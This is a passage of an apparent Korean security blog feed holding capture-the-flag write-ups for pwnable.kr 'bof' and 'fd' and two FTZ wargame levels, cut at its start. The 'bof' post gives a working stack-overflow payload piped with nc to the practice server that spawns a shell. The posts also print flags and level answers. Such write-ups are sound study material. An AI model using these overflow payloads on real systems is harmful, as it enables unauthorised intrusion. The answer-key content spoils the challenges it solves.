daddy&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt; I just managed to create a &lt;span class=&quot;token builtin class-name&quot;&gt;hash&lt;/span&gt; collision &lt;span class=&quot;token builtin class-name&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[Pwnable.kr bof]]></title><description><![CDATA[bof문제의 파일을 읽어보면 다음과 같다. func함수에서 의 취약점을 이용하여 overflow를 수행하는 문제이다. 이 프로그램을 파악해 보면 다음과 같다. 먼저 를 수행한다. 그 후 를 호출한다. 이 때 의 위치에 overflowme…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sat, 26 Mar 2016 12:00:00 GMT</pubDate><content:encoded>&lt;p&gt;bof문제의 파일을 읽어보면 다음과 같다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;string.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;stdlib.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; key&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; overflowme&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;overflow me : &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;overflowme&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;token comment&quot;&gt;// smash me!&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;key &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xcafebabe&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Nah..\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; argc&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; argv&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0xdeadbeef&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;func함수에서 &lt;code class=&quot;language-text&quot;&gt;gets&lt;/code&gt;의 취약점을 이용하여 overflow를 수행하는 문제이다. 이 프로그램을 파악해 보면 다음과 같다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;gdb-peda$ pdisas func
Dump of assembler code for function func:
   0x0000062c &amp;lt;+0&gt;:    push   ebp
   0x0000062d &amp;lt;+1&gt;:    mov    ebp,esp
   0x0000062f &amp;lt;+3&gt;:    sub    esp,0x48
   0x00000632 &amp;lt;+6&gt;:    mov    eax,gs:0x14
   0x00000638 &amp;lt;+12&gt;:    mov    DWORD PTR [ebp-0xc],eax
   0x0000063b &amp;lt;+15&gt;:    xor    eax,eax
   0x0000063d &amp;lt;+17&gt;:    mov    DWORD PTR [esp],0x78c ; &quot;overflow me : &quot;
   0x00000644 &amp;lt;+24&gt;:    call   printf
   0x00000649 &amp;lt;+29&gt;:    lea    eax,[ebp-0x2c] ; char overflowme[32]
   0x0000064c &amp;lt;+32&gt;:    mov    DWORD PTR [esp],eax
   0x0000064f &amp;lt;+35&gt;:    call   gets
   0x00000654 &amp;lt;+40&gt;:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
 ...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;먼저 &lt;code class=&quot;language-text&quot;&gt;call printf&lt;/code&gt;를 수행한다. 그 후 &lt;code class=&quot;language-text&quot;&gt;gets&lt;/code&gt;를 호출한다. 이 때 &lt;code class=&quot;language-text&quot;&gt;ebp - 0x2c&lt;/code&gt;의 위치에 &lt;strong&gt;overflowme&lt;/strong&gt;라는 배열이 들어있음을 확인할 수 있다.&lt;/p&gt;
&lt;p&gt;그 후 &lt;code class=&quot;language-text&quot;&gt;ebp + 0x8&lt;/code&gt;의 값과 0xcafebabe를 비교한다. overflow시켜야할 총 데이터는 0x2c + 0x8의 값을 덮어쓰고, 그 후에 원하는 데이터를 덮어야 한다.&lt;/p&gt;
&lt;p&gt;값은 &lt;strong&gt;리틀엔디안&lt;/strong&gt;이므로 반대로 넣어주면 된다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;ubuntu@ubuntu:~$ &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;python -c &lt;span class=&quot;token string&quot;&gt;&apos;print &quot;A&quot; * 52 + &quot;\xbe\xba\xfe\xca&quot;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;cat&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;nc&lt;/span&gt; pwnable.kr &lt;span class=&quot;token number&quot;&gt;9000&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;ls&lt;/span&gt;
bof
bof.c
flag
log
super.pl
&lt;span class=&quot;token function&quot;&gt;cat&lt;/span&gt; flag
daddy, I just pwned a buFFer &lt;span class=&quot;token builtin class-name&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[FTZ Level7]]></title><description><![CDATA[힌트파일을 보게되면 /bin/level7을 실행시키라고 한다. /bin/level…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sat, 26 Mar 2016 06:00:00 GMT</pubDate><content:encoded>&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;level7@ftz ~&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;$ &lt;span class=&quot;token function&quot;&gt;cat&lt;/span&gt; hint

/bin/level7 명령을 실행하면, 패스워드 입력을 요청한다.

&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;. 패스워드는 가까운곳에&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;. 상상력을 총동원하라.
&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;. &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;진수를 &lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt;진수를 바꿀 수 있는가?
&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;. 계산기 설정을 공학용으로 바꾸어라.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;힌트파일을 보게되면 /bin/level7을 실행시키라고 한다. /bin/level7을 실행해 보자.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;level7@ftz ~&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;$ /bin/level7
Insert The Password &lt;span class=&quot;token builtin class-name&quot;&gt;:&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;다음과 같이 비밀번호를 넣으라 한다. 아무 값이나 넣어 보자.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;level7@ftz ~&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;$ /bin/level7
Insert The Password &lt;span class=&quot;token builtin class-name&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;
올바르지 않은 패스워드 입니다.
    패스워드는 가까운곳에&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;.
--_--_- --____- ---_-__ --__-_-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;아래 그림을 보게 되면 비트와 비슷함을 느낄 수 있다. (사실 창의력이 좋지 않아 생각을 하지 못했었다.)&lt;/p&gt;
&lt;p&gt;1101101 1100001 1110100 1100101 이를 아스키 코드로 변환해보면 mate가 나오게 된다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;level7@ftz ~&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;$ /bin/level7
Insert The Password &lt;span class=&quot;token builtin class-name&quot;&gt;:&lt;/span&gt; mate

Congratulation&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt; next password is &lt;span class=&quot;token string&quot;&gt;&quot;               &quot;&lt;/span&gt;&lt;span class=&quot;token builtin class-name&quot;&gt;.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[FTZ Level6]]></title><description><![CDATA[level6에 접속을 하게 되면 다음과 같은 화면을 볼 수 있다. 여기서 를 누르게 되면 문제를 해결할 수 있다. 자세한 이유는 알지 못하지만, 다음으로 생각을 하고 있다. 먼저 쉘을 접속하게 되면 /etc/passwd…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sat, 26 Mar 2016 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;level6에 접속을 하게 되면 다음과 같은 화면을 볼 수 있다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;hint - 인포샵 bbs의 텔넷 접속 메뉴에서 많이 사용되던 해킹 방법이다.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;여기서 &lt;code class=&quot;language-text&quot;&gt;^C(Ctrl + C)&lt;/code&gt;를 누르게 되면 문제를 해결할 수 있다.&lt;/p&gt;
&lt;p&gt;자세한 이유는 알지 못하지만, 다음으로 생각을 하고 있다.&lt;/p&gt;
&lt;p&gt;먼저 쉘을 접속하게 되면 /etc/passwd에 있는 쉘로 실행이 되게 된다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;level6@ftz ~&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;$ &lt;span class=&quot;token function&quot;&gt;cat&lt;/span&gt; /etc/passwd
 &lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;.
level6❌3006:3006:Level &lt;span class=&quot;token number&quot;&gt;6&lt;/span&gt;:/home/level6:/bin/bash&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;/bin/bash가 실행되게 된다. 그럼 bash가 실행되는 과정인 ~/.bashrc를 읽어보겠다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;level6@ftz ~&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;$ &lt;span class=&quot;token function&quot;&gt;cat&lt;/span&gt; .bashrc
&lt;span class=&quot;token comment&quot;&gt;# .bashrc&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;# User specific aliases and functions&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;# Source global definitions&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt; -f /etc/bashrc &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;then&lt;/span&gt;
    &lt;span class=&quot;token builtin class-name&quot;&gt;.&lt;/span&gt; /etc/bashrc
&lt;span class=&quot;token keyword&quot;&gt;fi&lt;/span&gt;
&lt;span class=&quot;token builtin class-name&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;token assign-left variable&quot;&gt;&lt;span class=&quot;token environment constant&quot;&gt;PS1&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;[\u@\h \W]\$ &quot;&lt;/span&gt;
./tn
&lt;span class=&quot;token builtin class-name&quot;&gt;logout&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;여기서 &lt;code class=&quot;language-text&quot;&gt;./tn&lt;/code&gt;이라는 프로그램이 실행되는데, 이 프로그램이 우리가 시작하면서 만나는 프로그램이다.&lt;/p&gt;
&lt;p&gt;이 프로그램이 끝나면 logout을 하게되는데, 그래서 tn이 실행되는 중간에 실행중인 bash를 종료시키면 더이상 뒤의 구문이 실행되지 않아 logout이 실행되지 않고 종료되는것으로 추측하고 있다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Pwnable.kr fd]]></title><description><![CDATA[접속을 하게 되면 이와 같은 파일이 존재하게 됩니다. 이 문제를 보게 되면 14번째 줄에서 buf와 “LETMEWIN” 이라는 문자열을 비교하여 문제를 해결할 수 있습니다. buf에 입력을 하는 경우는 13번째 줄의 read…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Wed, 16 Mar 2016 12:00:00 GMT</pubDate><content:encoded>&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;ssh&lt;/span&gt; fd@pwnable.kr &lt;span class=&quot;token number&quot;&gt;2222&lt;/span&gt;
fd@ubuntu:~$ &lt;span class=&quot;token function&quot;&gt;ls&lt;/span&gt;
fd  fd.c  flag&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;접속을 하게 되면 이와 같은 파일이 존재하게 됩니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;fd@ubuntu&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;~&lt;/span&gt;$ cat fd&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;c
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;stdlib.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;string.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; buf&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; argc&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; argv&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; envp&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;argc&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;pass argv[1] a number\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; fd &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;atoi&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; argv&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x1234&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; len &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  len &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;fd&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; buf&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;LETMEWIN\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; buf&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;good job :)\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;/bin/cat flag&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;learn about Linux file IO\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이 문제를 보게 되면 14번째 줄에서 buf와 &lt;strong&gt;“LETMEWIN”&lt;/strong&gt; 이라는 문자열을 비교하여 문제를 해결할 수 있습니다.&lt;/p&gt;
&lt;p&gt;buf에 입력을 하는 경우는 13번째 줄의 read를 통하여 입력을 하게 되는데, read의 인자로는 file descriptor, 저장될 배열의 주소, 읽을 사이즈를 인자로 받습니다.&lt;/p&gt;
&lt;p&gt;저장될 주소는 buf에 저장이 되고, 읽는 데이터는 fd에서 읽습니다. fd의 값을 사용자가 수정할 수 있는데, 리눅스 상에서의 표준 fd는 다음과 같습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;0: stdin
1: stdout
2: stderr&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;stdin&lt;/code&gt;은 보통 키보드를 의미하며, &lt;code class=&quot;language-text&quot;&gt;stdout&lt;/code&gt;의 경우 출력창 이므로 콘솔, &lt;code class=&quot;language-text&quot;&gt;stderr&lt;/code&gt;또한 콘솔에 출력되는 내용을 말합니다. 우리가 입력을 받아야 하는데, 필요한 값은 fd가 0이 되도록 하는것 입니다.&lt;/p&gt;
&lt;p&gt;fd의 경우 atoi를 통하여 ascii를 int로 변경하여 되는 값에 0x1234를 뺀 값이 됩니다.&lt;/p&gt;
&lt;p&gt;fd = 0x1234 - 0x1234일 경우 0이 되므로 0x1234의 값인 4660을 넣어주어 문제를 해결하면 됩니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;fd@ubuntu:~$ ./fd &lt;span class=&quot;token number&quot;&gt;4660&lt;/span&gt;
LETMEWIN
good job &lt;span class=&quot;token builtin class-name&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
